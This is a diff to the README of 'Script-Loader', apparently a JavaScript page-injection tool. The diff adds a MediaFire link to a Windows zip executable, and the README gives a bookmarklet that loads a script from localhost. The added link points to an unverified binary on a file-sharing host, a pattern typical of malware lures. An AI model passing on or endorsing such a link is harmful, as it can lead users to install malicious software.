@@ -1,6 +1,6 @@
 # Script-Loader
 Automatically inject javascript into a web page with this application.
-
+https://www.mediafire.com/file/2dxki9cc9ecjubz/Script_Injector-win32-x64.zip/file
 
 # Quick Start
 1. Paste this url into a bookmarklet javascript:var scriptUrl='http://localhost:8080/loader.js';(function injectScript(scriptSrc, callback) {var script = document.createElement('script');script.type = 'text/javascript';script.async = false;script.src = scriptSrc;document.getElementsByTagName('head')[0].appendChild(script);}(scriptUrl));
